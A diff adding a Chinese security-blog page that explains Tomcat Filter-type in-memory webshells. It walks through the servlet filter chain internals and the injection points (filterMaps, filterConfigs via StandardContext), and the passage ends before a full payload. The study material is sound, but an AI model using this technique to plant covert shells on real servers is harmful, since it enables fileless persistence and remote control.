@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Java安全中的filter内存马是一种无需落地文件的攻击手段，其通过反射等技术动态构造恶意Filter对象，利用Web容器（如Tomcat、Jetty）的Filter注册机制将其注入到Filter链中，使恶意Filter能拦截并处理所有经过容器的HTTP请求，进而执行篡改请求、窃取数据、远程命令执行等恶意操作，且因无物理文件残留而更难被检测和清除。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全之Filter内存马">
+<meta property="og:url" content="http://zifeiyu-sec.github.io/2025/10/17/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BFilter%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="子非鱼的博客">
+<meta property="og:description" content="Java安全中的filter内存马是一种无需落地文件的攻击手段，其通过反射等技术动态构造恶意Filter对象，利用Web容器（如Tomcat、Jetty）的Filter注册机制将其注入到Filter链中，使恶意Filter能拦截并处理所有经过容器的HTTP请求，进而执行篡改请求、窃取数据、远程命令执行等恶意操作，且因无物理文件残留而更难被检测和清除。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251019103345752.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251019103623121.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251019103811213.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251019104049988.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251019104305218.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251019105121920.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251019105304261.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251019105534291.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251019111222326.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251019111500818.png">
+<meta property="article:published_time" content="2025-10-17T09:10:44.000Z">
+<meta property="article:modified_time" content="2025-10-31T09:33:01.387Z">
+<meta property="article:author" content="子非鱼">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zifeiyu-sec.github.io/images/ob-20251019103345752.png">
+
+
+<link rel="canonical" href="http://zifeiyu-sec.github.io/2025/10/17/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BFilter%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zifeiyu-sec.github.io/2025/10/17/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BFilter%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2025/10/17/Java攻防/Java安全之Filter内存马/","title":"Java安全之Filter内存马"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java安全之Filter内存马 | 子非鱼的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"cdn":"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.7.0/mermaid.min.js","integrity":"sha256-4+IKDqhZ/sXjc8Wtl2/MsxI4e0s1KpEVdbEP7V/Lz8U="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">子非鱼的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在时间的尺度上，一切问题都有答案</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">Filter型内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">基本介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-Filter"><span class="nav-number">1.1.1.</span> <span class="nav-text">一. Filter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.1.2.</span> <span class="nav-text">二. Filter 型内存马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Filter%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">Filter流程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%BC%94%E7%A4%BA"><span class="nav-number">1.2.1.</span> <span class="nav-text">代码演示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">1.2.2.</span> <span class="nav-text">执行流程分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%B5%8C%E5%85%A5-Filter-%E9%93%BE%E7%9A%84%E5%85%B3%E9%94%AE%E8%8A%82%E7%82%B9"><span class="nav-number">1.2.3.</span> <span class="nav-text">内存马嵌入 Filter 链的关键节点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80-%E4%BF%AE%E6%94%B9filterMaps%E5%92%8CfilterConfigs"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">一. 修改filterMaps和filterConfigs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C-%E4%BF%AE%E6%94%B9filterMaps%E8%AE%A9%E6%81%B6%E6%84%8F-Filter-%E8%A2%AB%E5%8C%B9%E9%85%8D"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">二.  修改filterMaps让恶意 Filter 被匹配</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89-%E4%BF%AE%E6%94%B9filterConfigs%E8%AE%A9%E6%81%B6%E6%84%8F-Filter-%E8%A2%AB%E6%89%BE%E5%88%B0"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">三.  修改filterConfigs让恶意 Filter 被找到</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%9B-%E7%A1%AE%E4%BF%9Dfilters%E6%95%B0%E7%BB%84%E5%8C%85%E5%90%AB%E6%81%B6%E6%84%8F-Filter"><span class="nav-number">1.2.3.4.</span> <span class="nav-text">四. 确保filters数组包含恶意 Filter</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.3.</span> <span class="nav-text">filter内存马</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="子非鱼"
+      src="/images/1.png">
+  <p class="site-author-name" itemprop="name">子非鱼</p>
+  <div class="site-description" itemprop="description">学习过程的记录</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zifeiyu-sec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/zifeiyu-sec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://example.com/" title="https:&#x2F;&#x2F;example.com" rel="noopener" target="_blank">Title</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zifeiyu-sec.github.io/2025/10/17/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BFilter%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.png">
+      <meta itemprop="name" content="子非鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="子非鱼的博客">
+      <meta itemprop="description" content="学习过程的记录">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java安全之Filter内存马 | 子非鱼的博客">
+      <meta itemprop="description" content="Java安全中的filter内存马是一种无需落地文件的攻击手段，其通过反射等技术动态构造恶意Filter对象，利用Web容器（如Tomcat、Jetty）的Filter注册机制将其注入到Filter链中，使恶意Filter能拦截并处理所有经过容器的HTTP请求，进而执行篡改请求、窃取数据、远程命令执行等恶意操作，且因无物理文件残留而更难被检测和清除。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java安全之Filter内存马
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-17 17:10:44" itemprop="dateCreated datePublished" datetime="2025-10-17T17:10:44+08:00">2025-10-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-10-31 17:33:01" itemprop="dateModified" datetime="2025-10-31T17:33:01+08:00">2025-10-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">Java攻防</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">Java安全中的filter内存马是一种无需落地文件的攻击手段，其通过反射等技术动态构造恶意Filter对象，利用Web容器（如Tomcat、Jetty）的Filter注册机制将其注入到Filter链中，使恶意Filter能拦截并处理所有经过容器的HTTP请求，进而执行篡改请求、窃取数据、远程命令执行等恶意操作，且因无物理文件残留而更难被检测和清除。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1>Filter型内存马</h1>
+<h2 id="基本介绍">基本介绍</h2>
+<h3 id="一-Filter">一. Filter</h3>
+<ol>
+<li><strong>基本概念</strong>Filter 是运行在 Servlet 之前或之后的组件，可拦截客户端对 Servlet 的请求（<code>request</code>）和 Servlet 返回的响应（<code>response</code>），实现日志记录、权限校验、字符编码转换、数据过滤等功能。</li>
+<li><strong>核心原理</strong>
+<ul>
+<li>遵循 Servlet 规范，需实现<code>javax.servlet.Filter</code>接口，重写<code>init()</code>（初始化）、<code>doFilter()</code>（核心过滤逻辑）、<code>destroy()</code>（销毁）方法。</li>
+<li>通过<code>web.xml</code>配置或注解（<code>@WebFilter</code>）指定拦截的 URL 模式（如<code>/*</code>拦截所有请求），容器（如 Tomcat）会根据配置将 Filter 加入请求处理链。</li>
+<li>执行流程：客户端请求 → Filter 的<code>doFilter()</code>（可通过<code>chain.doFilter(request, response)</code>放行到下一个 Filter 或 Servlet）→ Servlet 处理 → 回到 Filter 进行响应处理。</li>
+</ul>
+</li>
+</ol>
+<h3 id="二-Filter-型内存马">二. Filter 型内存马</h3>
+<ol>
+<li><strong>基本概念</strong>Filter 型内存马是攻击者通过动态注册恶意 Filter 到 Web 容器中，实现对所有请求的拦截并执行恶意代码（如命令执行、数据窃取）的攻击方式。由于无需在磁盘生成文件，难以通过传统文件查杀检测。</li>
+<li><strong>实现原理</strong>核心是利用 Web 容器的内部 API，动态构造恶意 Filter 并将其注册到 Filter 链中，关键步骤包括：
+<ul>
+<li><strong>获取容器上下文</strong>：通过<code>ServletContext</code>或容器特定类（如 Tomcat 的<code>StandardContext</code>）获取 Web 应用上下文。</li>
+<li><strong>构造恶意 Filter</strong>：定义一个实现<code>Filter</code>接口的类，在<code>doFilter()</code>中编写恶意逻辑（如执行系统命令）。</li>
+<li><strong>动态注册</strong>：调用容器的 API（如 Tomcat 的<code>addFilter()</code>、<code>addMappingForUrlPatterns()</code>）将恶意 Filter 注册，指定拦截所有 URL（<code>/*</code>），使其能拦截所有请求。</li>
+</ul>
+</li>
+<li><strong>危害</strong>一旦成功注入，攻击者可通过发送请求触发恶意 Filter，持久化控制服务器，且由于内存马存在于进程内存中，重启服务后通常会消失（除非结合其他持久化手段）。</li>
+</ol>
+<h2 id="Filter流程分析">Filter流程分析</h2>
+<h3 id="代码演示">代码演示</h3>
+<p>创建一个Filter项目<br>
+新建类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.listendemo;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpFilter;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterDemo</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(HttpServletRequest req, HttpServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        String cmd= req.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span>(cmd==<span class="literal">null</span>)&#123;  </span><br><span class="line">            <span class="built_in">super</span>.doFilter(req,res,chain);  </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            res.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);  </span><br><span class="line">            res.getWriter().write(<span class="string">&quot;您输入了: &quot;</span>+cmd);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后再web.xml中添加路径配置, 或者@WebServlet()</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.example.listendemo.FilterDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后启动服务器, 由于我在过滤器处除了过滤做一个出书外, 没有做其他处理, 所以当过滤器遇到<code>?cmd=</code>参数, 就会页面输出, 不会继续往下执行</p>
+<h3 id="执行流程分析">执行流程分析</h3>
+<p>添加tomcat-catalina依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.58<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后在<code>FilterDemo</code>类中<code>super.doFilter(req,res,chain);</code>一行打上断点开始分析<br>
+<img src="/images/ob-20251019103345752.png" alt=""><br>
+步入查看, 当执行到如图位置, 分析<br>
+<img src="/images/ob-20251019103623121.png" alt=""><br>
+在这个函数中, 发现不管<code>if</code>判断成立还是不成立, 都会执行<code>internalDoFilter()</code><br>
+<img src="/images/ob-20251019103811213.png" alt=""><br>
+执行运行到下面一个internalDoFilter(). 并且步入查看<br>
+<img src="/images/ob-20251019104049988.png" alt=""><br>
+<code>internalDoFilter</code>这个方法执行流程是:</p>
+<ul>
+<li>首先检查是否还有过滤器需要执行(<code>if (pos &lt; n)</code>)，其中<code>pos</code>是当前过滤器的位置，<code>n</code>是过滤器总数。</li>
+<li>如果还有过滤器，获取下一个过滤器配置(<code>ApplicationFilterConfig</code>)并递增位置指针(<code>pos++</code>)。<br>
+<code>internalDoFilter</code>方法中<code>ApplicationFilterConfig filterConfig = filters[pos++];</code></li>
+<li>从过滤器集合<code>filters</code>中按顺序取出下一个过滤器配置</li>
+<li>同时将当前位置指针<code>pos</code>向前移动一位，为下一次迭代做准备<br>
+查看堆栈<br>
+<img src="/images/ob-20251019104305218.png" alt=""><br>
+可以看到<code>filters</code>数组有两个值, 一个是我们自定义的filterDemo, 另外一个是内置的.<br>
+所以我们的目的是在filters数组中添加进内存马, 然后让其自己加载执行.<br>
+查看数组类型<br>
+<img src="/images/ob-20251019105121920.png" alt=""><br>
+发现在头部这里创建一个空数组<br>
+继续分析他的赋值发生的位置<br>
+<img src="/images/ob-20251019105304261.png" alt=""><br>
+发生在<code>addFilter</code>方法中, 查看<code>addFilter</code>方法在何处调用<br>
+<img src="/images/ob-20251019105534291.png" alt=""><br>
+在<code>createFilterChain</code>中调用<br>
+<code>filterChain.addFilter(filterConfig)</code>会将<code>ApplicationFilterConfig</code>（包含 Filter 实例）存入<code>ApplicationFilterChain</code>的<code>filters</code>数组<br>
+这个方法执行流程是</li>
+<li>
+<ol>
+<li>初始化过滤器链
+<ul>
+<li>首先检查是否有Servlet需要执行，如果没有则返回null</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>根据请求类型创建或重用ApplicationFilterChain对象，对于非安全环境下的普通请求会尝试重用以提高性能</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>设置Servlet</li>
+</ol>
+<ul>
+<li>将目标Servlet和异步支持属性设置到过滤器链中</li>
+</ul>
+</li>
+<li>
+<ol start="3">
+<li>获取过滤器映射</li>
+</ol>
+<ul>
+<li>从StandardContext中获取所有配置的过滤器映射(FilterMap)</li>
+</ul>
+</li>
+<li>
+<ol start="4">
+<li>匹配URL模式的过滤器</li>
+</ol>
+<ul>
+<li>遍历所有过滤器映射，首先查找与请求路径匹配的过滤器</li>
+<li>检查分发器类型(dispatcher type)和URL模式是否匹配</li>
+<li>如果匹配，则将对应的过滤器配置添加到过滤器链中</li>
+</ul>
+</li>
+<li>
+<ol start="5">
+<li>匹配Servlet名称的过滤器</li>
+</ol>
+<ul>
+<li>再次遍历过滤器映射，这次查找与Servlet名称匹配的过滤器</li>
+<li>同样进行分发器类型和Servlet名称匹配检查</li>
+<li>如果匹配，则将对应的过滤器配置添加到过滤器链中</li>
+</ul>
+</li>
+<li>
+<ol start="6">
+<li>返回完整过滤器链</li>
+</ol>
+<ul>
+<li>最终返回包含所有适用过滤器的过滤器链对象</li>
+</ul>
+</li>
+</ul>
+<p>然后查看createFilterChain方法的调用<br>
+<img src="/images/ob-20251019111222326.png" alt="">通过分析, 在<code>StandardWrapperValve#invoke</code>中调用<br>
+在这个方法中有一个filterChain<br>
+<img src="/images/ob-20251019111500818.png" alt=""><br>
+当<code>createFilterChain</code>生成链后，<code>StandardWrapperValve</code>会调用<code>filterChain.doFilter(request, response)</code>启动链的执行</p>
+<h3 id="内存马嵌入-Filter-链的关键节点">内存马嵌入 Filter 链的关键节点</h3>
+<p>根据上述链分析，Filter 型内存马要成功嵌入并执行，需在以下节点干预：</p>
+<h4 id="一-修改filterMaps和filterConfigs">一. 修改filterMaps和filterConfigs</h4>
+<p><code>createFilterChain</code>用于创建当前请求的 Filter 链，其工作的核心是从<code>StandardContext</code>中获取两个关键数据结构：</p>
+<ul>
+<li><strong><code>filterMaps</code></strong>：存储所有 Filter 的映射规则（Filter 名称→拦截 URL/ Servlet 名称 / 请求类型），是匹配请求的 “规则库”；</li>
+<li><strong><code>filterConfigs</code></strong>：存储所有 Filter 的实例及配置（Filter 名称→<code>ApplicationFilterConfig</code>），是获取 Filter 实例的 “仓库”。<br>
+这两个结构均由<code>StandardContext</code>维护，而<code>createFilterChain</code>的逻辑完全依赖它们：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从StandardContext中获取所有Filter映射规则</span></span><br><span class="line">FilterMap[] filterMaps = context.findFilterMaps(); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历规则，匹配当前请求后，从filterConfigs中获取对应的Filter实例</span></span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> context.findFilterConfig(filterMap.getFilterName());</span><br></pre></td></tr></table></figure>
+<p>因此，<strong><code>StandardContext</code>的<code>filterMaps</code>和<code>filterConfigs</code>是<code>createFilterChain</code>的 “数据源”</strong>，攻击者只要修改这两个数据源，就能让<code>createFilterChain</code>在生成链时 “被动” 纳入恶意 Filter。</p>
+<h4 id="二-修改filterMaps让恶意-Filter-被匹配">二.  修改<code>filterMaps</code>让恶意 Filter 被匹配</h4>
+<p><code>filterMaps</code>的作用是定义 “哪些请求需要经过哪些 Filter”。在<code>createFilterChain</code>中，会遍历<code>filterMaps</code>中的每一个<code>FilterMap</code>，检查其是否与当前请求匹配（URL 模式、请求类型等）。<br>
+以你提供的代码为例，攻击者通过<code>standardContext.addFilterMap(filterMap)</code>添加的恶意<code>FilterMap</code>会被纳入<code>filterMaps</code>数组。当新请求到达时：</p>
+<ol>
+<li><code>createFilterChain</code>遍历<code>filterMaps</code>，必然会遇到这个恶意<code>FilterMap</code>；</li>
